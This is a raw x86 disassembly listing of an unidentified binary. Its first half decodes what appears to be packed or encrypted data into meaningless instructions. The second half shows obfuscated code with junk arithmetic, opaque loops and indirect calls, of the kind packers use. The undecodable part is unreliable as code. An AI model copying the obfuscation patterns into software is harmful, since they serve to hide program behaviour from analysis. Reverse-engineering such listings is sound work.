  41896e:	shl    DWORD PTR [ebp+0x176fe23f],1
  418974:	jle    0x418912
  418976:	jnp    0x4189b4
  418978:	(bad)  
  418979:	xor    BYTE PTR [eax-0x33],bl
  41897c:	inc    edx
  41897d:	xor    eax,0x26e6b1b7
  418982:	pop    ecx
  418983:	pop    es
  418984:	sbb    ecx,DWORD PTR [ebp-0x4e]
  418987:	cmp    BYTE PTR [edx],dh
  418989:	mov    eax,ds:0x14972b6b
  41898e:	xchg   esp,eax
  41898f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418990:	dec    ebp
  418991:	stos   DWORD PTR es:[edi],eax
  418992:	mov    esi,0x599f1962
  418997:	xor    BYTE PTR [edi+ebp*4],ch
  41899a:	fdiv   DWORD PTR [ecx-0x2]
  41899d:	test   al,0xb
  41899f:	fdiv   QWORD PTR [eax]
  4189a1:	adc    bh,0xa2
  4189a4:	inc    edx
  4189a5:	sar    BYTE PTR [eax+0x2e],cl
  4189a8:	shl    DWORD PTR [edi+eiz*4-0x28],cl
  4189ac:	and    esp,0xffffffec
  4189af:	idiv   BYTE PTR [ecx+0x6e]
  4189b2:	mov    ebx,0x88222a47
  4189b7:	repnz or bh,BYTE PTR cs:[ebx+eax*8-0x5a28e350]
  4189c0:	fsub   st,st(0)
  4189c2:	scas   eax,DWORD PTR es:[edi]
  4189c3:	cli    
  4189c4:	sti    
  4189c5:	inc    esp
  4189c6:	xchg   edx,eax
  4189c7:	scas   eax,DWORD PTR es:[edi]
  4189c8:	add    esp,DWORD PTR [edx+0x12ebe847]
  4189ce:	dec    edi
  4189cf:	dec    edi
  4189d0:	and    bh,dh
  4189d2:	xchg   ebp,eax
  4189d3:	ficom  DWORD PTR [ecx]
  4189d5:	ins    BYTE PTR es:[edi],dx
  4189d6:	loop   0x418a09
  4189d8:	and    al,0xa4
  4189da:	int    0x6b
  4189dc:	aaa    
  4189dd:	adc    bl,BYTE PTR ds:0xe5129d1c
  4189e3:	das    
  4189e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189e5:	imul   BYTE PTR [eax-0x57]
  4189e8:	test   eax,0xc263e2fd
  4189ed:	dec    edx
  4189ee:	sbb    ah,BYTE PTR [eax+0x38]
  4189f1:	push   0x67
  4189f3:	test   eax,ebx
  4189f5:	fs popa 
  4189f7:	pop    ds
  4189f8:	fwait
  4189f9:	mov    ss,WORD PTR [eax]
  4189fb:	push   ss
  4189fc:	jbe    0x4189bc
  4189fe:	sub    DWORD PTR [esp+edi*4],esi
  418a01:	sub    edi,ebx
  418a03:	push   ds
  418a04:	out    0x81,al
  418a06:	dec    eax
  418a07:	fwait
  418a08:	pop    es
  418a09:	fdiv   st,st(7)
  418a0b:	mov    al,ds:0xd9ab15d8
  418a10:	jno    0x418a2e
  418a12:	(bad)  
  418a13:	mov    eax,ds:0x2c8336d6
  418a18:	mov    cl,0xc8
  418a1a:	sbb    DWORD PTR ds:[eax+0x71],edi
  418a1e:	and    dl,0xc1
  418a21:	push   ss
  418a22:	push   eax
  418a23:	sub    eax,0x7e228ce
  418a28:	dec    esi
  418a29:	aaa    
  418a2a:	pushf  
  418a2b:	jmp    0x418a86
  418a2d:	and    BYTE PTR [esi+0x10298907],bl
  418a33:	and    esi,esp
  418a35:	jle    0x418a13
  418a37:	xchg   ecx,eax
  418a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a39:	dec    ebx
  418a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a3b:	xor    eax,0x2ebcc58c
  418a40:	bound  ebx,QWORD PTR [ebx]
  418a42:	into   
  418a43:	shr    esp,1
  418a45:	les    esp,FWORD PTR [edi]
  418a47:	add    BYTE PTR [ebp-0x155d3031],bh
  418a4d:	sub    cl,dh
  418a4f:	dec    DWORD PTR ds:0xf28d5066
  418a55:	xchg   edi,eax
  418a56:	mov    ah,0xb3
  418a58:	inc    esp
  418a59:	rcl    DWORD PTR [esp+eax*1-0x64d898a7],1
  418a60:	adc    edx,DWORD PTR [ecx-0x21]
  418a63:	jmp    0x418ab0
  418a65:	das    
  418a66:	fstp   st(4)
  418a68:	aas    
  418a69:	je     0x418a5a
  418a6b:	sub    ecx,DWORD PTR [esi+0x60]
  418a6e:	pop    es
  418a6f:	or     eax,0x709f0470
  418a74:	inc    eax
  418a75:	push   esi
  418a76:	dec    esp
  418a77:	test   esi,edx
  418a79:	sub    DWORD PTR [esi],0x96d725de
  418a7f:	ss cmc 
  418a81:	imul   ebp,DWORD PTR [edx+0x17f7f263],0xffffff90
  418a88:	out    0xab,eax
  418a8a:	mov    ds:0x8d791c5b,al
  418a8f:	push   ebx
  418a90:	fs loop 0x418a3e
  418a93:	aad    0xec
  418a95:	test   eax,0xa200f132
  418a9a:	fwait
  418a9b:	dec    ebx
  418a9c:	cwde   
  418a9d:	push   eax
  418a9e:	sbb    eax,0x593e522
  418aa3:	adc    al,0xa2
  418aa5:	fimul  WORD PTR [edx-0x675cc221]
  418aab:	mov    dl,0xe9
  418aad:	dec    ebp
  418aae:	mov    dh,0x71
  418ab0:	pop    eax
  418ab1:	inc    esi
  418ab2:	fidivr DWORD PTR [edx-0x2f47f69f]
  418ab8:	sbb    bh,BYTE PTR [edi]
  418aba:	jl     0x418a45
  418abc:	sbb    cl,BYTE PTR [ebx-0x54]
  418abf:	mov    cl,0x1
  418ac1:	dec    edi
  418ac2:	jge    0x418af9
  418ac4:	sbb    ebx,DWORD PTR [edx]
  418ac6:	jb     0x418aa2
  418ac8:	xchg   DWORD PTR [eax-0x25101dc4],eax
  418ace:	pushf  
  418acf:	xor    eax,0xb9d0c782
  418ad4:	fwait
  418ad5:	xor    DWORD PTR [edx+0x9],ebx
  418ad8:	cmp    BYTE PTR [ebp-0x40],dh
  418adb:	mov    WORD PTR [edi],cs
  418add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ade:	data16 jo 0x418b27
  418ae1:	adc    eax,0x75f44a2d
  418ae6:	test   DWORD PTR [eax-0x50],ecx
  418ae9:	add    bh,BYTE PTR [eax]
  418aeb:	sub    eax,DWORD PTR [edi-0x4c899457]
  418af1:	mov    ah,0xe2
  418af3:	push   esp
  418af4:	mov    esp,0xa68d8137
  418af9:	inc    eax
  418afa:	jno    0x418b25
  418afc:	leave  
  418afd:	sbb    DWORD PTR [ebx],esp
  418aff:	fdivr  st,st(5)
  418b01:	jns    0x418aa3
  418b03:	xor    eax,0xeb544fdd
  418b08:	dec    ebx
  418b09:	mov    ds:0x8384c35a,al
  418b0e:	icebp  
  418b0f:	jp     0x418b03
  418b11:	mov    ?,ebp
  418b13:	sbb    BYTE PTR [esi-0x5186108d],bl
  418b19:	cmp    eax,0xc94d9c36
  418b1e:	cld    
  418b1f:	and    eax,0x55eecf14
  418b24:	or     bh,BYTE PTR [edi-0x43]
  418b27:	lock jns 0x418b9c
  418b2a:	pusha  
  418b2b:	mov    ebp,0x75baa284
  418b30:	and    al,BYTE PTR [edx-0x1a2e4aac]
  418b36:	(bad)  
  418b37:	addr16 int 0x3
  418b3a:	xchg   esi,eax
  418b3b:	xor    eax,0x1daf3e4
  418b40:	repnz fnstenv [esi+0x48]
  418b44:	js     0x418b68
  418b46:	loope  0x418b17
  418b48:	xlat   BYTE PTR ds:[ebx]
  418b49:	jno    0x418b3f
  418b4b:	fistp  WORD PTR [ecx]
  418b4d:	hlt    
  418b4e:	arpl   WORD PTR [esi-0x162a5ef],cx
  418b54:	pop    esi
  418b55:	fist   DWORD PTR [ebp-0x7aa874f]
  418b5b:	retf   
  418b5c:	jg     0x418b2d
  418b5e:	hlt    
  418b5f:	adc    eax,0x81772f2
  418b64:	ds jle 0x418bbc
  418b67:	dec    ecx
  418b68:	add    eax,0xbe93b947
  418b6d:	dec    ebx
  418b6e:	xor    esp,esp
  418b70:	in     al,dx
  418b71:	ja     0x418b7e
  418b73:	pop    ebp
  418b74:	mov    eax,0xd3d3f368
  418b79:	jnp    0x418bb6
  418b7b:	ds enter 0xbe58,0xef
  418b80:	cmp    al,0x12
  418b82:	icebp  
  418b83:	int    0x96
  418b85:	dec    edx
  418b86:	or     ch,BYTE PTR ds:0xc49c8522
  418b8c:	dec    ebp
  418b8d:	adc    al,0xa
  418b8f:	mov    dl,0x85
  418b91:	iret   
  418b92:	test   DWORD PTR [ecx],edi
  418b94:	sahf   
  418b95:	mov    bl,0x1
  418b97:	arpl   WORD PTR [esi+0x470989a1],bp
  418b9d:	lock sahf 
  418b9f:	outs   dx,BYTE PTR ds:[esi]
  418ba0:	sub    al,0x65
  418ba2:	clc    
  418ba3:	sbb    bl,BYTE PTR ds:0x92a7b53f
  418ba9:	jecxz  0x418b34
  418bab:	adc    dh,cl
  418bad:	sbb    al,0xba
  418baf:	jl     0x418b83
  418bb1:	rcl    BYTE PTR [edi],1
  418bb3:	mov    ah,0x54
  418bb5:	icebp  
  418bb6:	cs dec edi
  418bb8:	pop    ss
  418bb9:	cmc    
  418bba:	dec    ecx
  418bbb:	xor    al,0xd9
  418bbd:	icebp  
  418bbe:	loopne 0x418b62
  418bc0:	imul   eax,DWORD PTR [esi-0x1c],0xffffffac
  418bc4:	pop    edi
  418bc5:	rep lods eax,DWORD PTR gs:[esi]
  418bc8:	scas   al,BYTE PTR es:[edi]
  418bc9:	pop    ss
  418bca:	pushf  
  418bcb:	sub    cl,BYTE PTR ds:0x8236416e
  418bd1:	jb     0x418b97
  418bd3:	mov    edi,0xe67c56c
  418bd8:	and    esi,DWORD PTR [edx+0xc]
  418bdb:	enter  0xa67b,0xbb
  418bdf:	sub    ah,dh
  418be1:	jp     0x418ba1
  418be3:	pop    es
  418be4:	jmp    0x3416:0x15c0ef35
  418beb:	jo     0x418c35
  418bed:	dec    ebp
  418bee:	jns    0x418c6a
  418bf0:	ds dec esp
  418bf2:	pop    esp
  418bf3:	jl     0x418c4f
  418bf5:	add    eax,0x731f9dfc
  418bfa:	mov    dh,0x7a
  418bfc:	xchg   BYTE PTR [ecx],bh
  418bfe:	cmc    
  418bff:	dec    esp
  418c00:	xchg   edx,eax
  418c01:	push   edx
  418c02:	dec    esp
  418c03:	inc    eax
  418c04:	neg    BYTE PTR [esi-0x77]
  418c07:	rol    ebx,1
  418c09:	jnp    0x418bee
  418c0b:	mov    ch,0xba
  418c0d:	pop    es
  418c0e:	loop   0x418c42
  418c10:	outs   dx,DWORD PTR ds:[esi]
  418c11:	gs push ebx
  418c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c14:	add    ah,bl
  418c16:	(bad)  
  418c18:	mov    ch,0xca
  418c1a:	cmp    dl,BYTE PTR [edx+0x5f]
  418c1d:	and    ebx,DWORD PTR [esi-0x69]
  418c20:	mov    bl,0x63
  418c22:	adc    ah,dh
  418c24:	mov    ah,0x0
  418c26:	mov    ecx,0xeb46fd29
  418c2b:	(bad)  
  418c2c:	loope  0x418c36
  418c2e:	ret    0x8f1
  418c31:	fld    QWORD PTR [ebx+0x4e6faece]
  418c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c38:	mov    ebx,0xf663eeb2
  418c3d:	mov    esp,0xadaf7c77
  418c42:	mov    esp,0x4000ffd8
  418c47:	or     edi,DWORD PTR [ebx-0x80]
  418c4a:	(bad)  
  418c4b:	out    0xe1,eax
  418c4d:	iret   
  418c4e:	imul   esp,DWORD PTR [esi-0x3d6b6b97],0xf3722ff0
  418c58:	push   edx
  418c59:	(bad)  
  418c5a:	js     0x418c07
  418c5c:	fs push edx
  418c5e:	mov    dl,0x52
  418c60:	xor    BYTE PTR [ecx-0x11e3f5c5],dl
  418c66:	fsubr  DWORD PTR [ebx+ecx*8]
  418c69:	xor    edx,edi
  418c6b:	mov    ah,0xab
  418c6d:	lods   al,BYTE PTR ds:[esi]
  418c6e:	dec    DWORD PTR [ecx+0x3ac2e71c]
  418c74:	mov    eax,ds:0xb0eb1d47
  418c79:	mov    esp,0x34095ecd
  418c7e:	and    BYTE PTR [ecx],0xd9
  418c81:	outs   dx,DWORD PTR ds:[esi]
  418c82:	or     BYTE PTR [ecx+0x5c4400fd],0x64
  418c89:	rcl    DWORD PTR [ecx+0x6d],1
  418c8c:	cmp    edi,DWORD PTR [ebx]
  418c8e:	dec    edx
  418c8f:	idiv   eax
  418c91:	push   esi
  418c92:	in     eax,dx
  418c93:	enter  0xdce6,0xc2
  418c97:	cmp    esp,DWORD PTR [ebx+0x53211017]
  418c9d:	xchg   ecx,eax
  418c9e:	xchg   ebp,eax
  418c9f:	dec    esi
  418ca0:	xor    bl,BYTE PTR [eax]
  418ca2:	test   al,0xa7
  418ca4:	je     0x418c2c
  418ca6:	push   ebx
  418ca7:	(bad)  
  418ca8:	xchg   ebx,eax
  418ca9:	jl     0x418c32
  418cab:	mov    dl,0xce
  418cad:	sub    bh,bh
  418caf:	aaa    
  418cb0:	clc    
  418cb1:	sub    BYTE PTR [edi+0x4c],ch
  418cb4:	ror    eax,1
  418cb6:	ins    BYTE PTR es:[edi],dx
  418cb7:	push   edi
  418cb8:	sbb    dh,BYTE PTR [ecx+0x7e5e4974]
  418cbe:	and    al,0xfb
  418cc0:	ret    
  418cc1:	test   al,0x74
  418cc3:	sti    
  418cc4:	sub    BYTE PTR [eax+0x74dfd586],dh
  418cca:	pop    edi
  418ccb:	push   0xc0f5bd2a
  418cd0:	xchg   esi,eax
  418cd1:	pop    ecx
  418cd2:	and    eax,0x74
  418cd5:	test   DWORD PTR [esi-0x4a33ec94],eax
  418cdb:	jmp    0xa594679a
  418ce0:	jns    0x418c7d
  418ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce3:	cmp    edi,DWORD PTR [ecx-0x19]
  418ce6:	add    eax,DWORD PTR cs:[esi+0x73e97313]
  418ced:	sbb    BYTE PTR [ebp-0x1d327026],0xb4
  418cf4:	and    esi,ebp
  418cf6:	push   edx
  418cf7:	pop    edx
  418cf8:	dec    esi
  418cf9:	out    0x1,eax
  418cfb:	loopne 0x418cbc
  418cfd:	dec    eax
  418cfe:	jg     0x418d2a
  418d00:	pop    esi
  418d01:	sbb    edi,DWORD PTR [ebx-0x64]
  418d04:	ja     0x418d3e
  418d06:	mov    ?,WORD PTR [edi+ebp*1-0x42]
  418d0a:	stos   BYTE PTR es:[edi],al
  418d0b:	pop    ds
  418d0c:	xchg   ecx,eax
  418d0d:	sbb    BYTE PTR [edi-0xd],0xf2
  418d11:	retf   0xf461
  418d14:	inc    esp
  418d15:	fwait
  418d16:	dec    edi
  418d17:	add    al,0x12
  418d19:	lock sbb eax,esp
  418d1c:	mov    ebp,0x44968119
  418d21:	adc    bh,BYTE PTR [ecx-0x723948fd]
  418d27:	or     esp,ebp
  418d29:	or     eax,0xf1ffacd5
  418d2e:	pop    ebx
  418d2f:	and    bl,BYTE PTR [edx+0x70c1afa]
  418d35:	sahf   
  418d36:	(bad)  
  418d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d38:	mov    ebp,0x53f073f4
  418d3d:	pop    ecx
  418d3e:	pop    ds
  418d3f:	cmc    
  418d40:	xchg   edx,eax
  418d41:	scas   al,BYTE PTR es:[edi]
  418d42:	push   edx
  418d43:	add    ax,0xf685
  418d47:	sbb    ch,bl
  418d49:	stos   DWORD PTR es:[edi],eax
  418d4a:	adc    bh,BYTE PTR [edx]
  418d4c:	(bad)  
  418d4d:	jne    0x418cf7
  418d4f:	add    bl,BYTE PTR [esi]
  418d51:	in     al,0x7d
  418d53:	(bad)  
  418d55:	rol    DWORD PTR ds:0x8968dfa4,cl
  418d5b:	lock sbb edx,DWORD PTR [ebp+0x34245227]
  418d62:	pop    ecx
  418d63:	push   ebp
  418d64:	(bad)  
  418d65:	das    
  418d66:	(bad)  
  418d67:	rcr    BYTE PTR [edi+esi*1-0x17d3df0e],cl
  418d6e:	mov    WORD PTR [ecx+esi*1-0x2e],cs
  418d72:	gs add eax,0x2af3bec7
  418d78:	xor    eax,DWORD PTR [esi]
  418d7a:	cmp    cl,BYTE PTR [edx-0x57fe927]
  418d80:	fmul   st,st(2)
  418d82:	ds cwde 
  418d84:	xor    cl,dh
  418d86:	inc    ebp
  418d87:	cmp    dh,0xc2
  418d8a:	ret    
  418d8b:	mov    ah,0xb3
  418d8d:	mov    al,ds:0xc87c0e80
  418d92:	push   DWORD PTR [edx+0x308cb18]
  418d98:	je     0x418e04
  418d9a:	in     eax,dx
  418d9b:	pop    edi
  418d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d9d:	xchg   ecx,eax
  418d9e:	(bad)  
  418d9f:	shr    bl,0xc0
  418da2:	rcl    DWORD PTR [ebp-0x2b17dc11],1
  418da8:	push   ebx
  418da9:	mov    bl,BYTE PTR [ecx+0x7e]
  418dac:	xchg   esi,eax
  418dad:	pop    ecx
  418dae:	push   edx
  418daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db0:	cmp    DWORD PTR [edi],0xe4d9f645
  418db6:	fcom   st(1)
  418db8:	xchg   ebp,eax
  418db9:	fadd   DWORD PTR [ebx+0x25]
  418dbc:	test   eax,0x345cda80
  418dc1:	and    al,0x2f
  418dc3:	hlt    
  418dc4:	and    esi,DWORD PTR [ebx+esi*2]
  418dc7:	sub    ebp,ebp
  418dc9:	(bad)  
  418dca:	pop    ebx
  418dcb:	sbb    BYTE PTR [eax+0x4be0c639],ah
  418dd1:	sbb    BYTE PTR [ecx+esi*1+0x774de881],al
  418dd8:	jle    0x418d6c
  418dda:	push   ecx
  418ddb:	inc    eax
  418ddc:	jmp    0x418e14
  418dde:	mov    ebp,0x7e3991f
  418de3:	xlat   BYTE PTR ds:[ebx]
  418de4:	pushf  
  418de5:	mov    esp,0x39f6957
  418dea:	aas    
  418deb:	mov    edx,0xad5b61aa
  418df0:	jno    0x418d96
  418df2:	lock test BYTE PTR [esi+esi*4+0x44],0xfb
  418df8:	imul   BYTE PTR [ebp-0x3dcf0fcd]
  418dfe:	nop
  418dff:	xchg   edx,eax
  418e00:	dec    ebp
  418e01:	and    eax,0x494909a5
  418e06:	xor    ebx,DWORD PTR [esi]
  418e08:	jae    0x418d95
  418e0a:	push   ebp
  418e0b:	lock or DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42aa1f
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42aa23
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
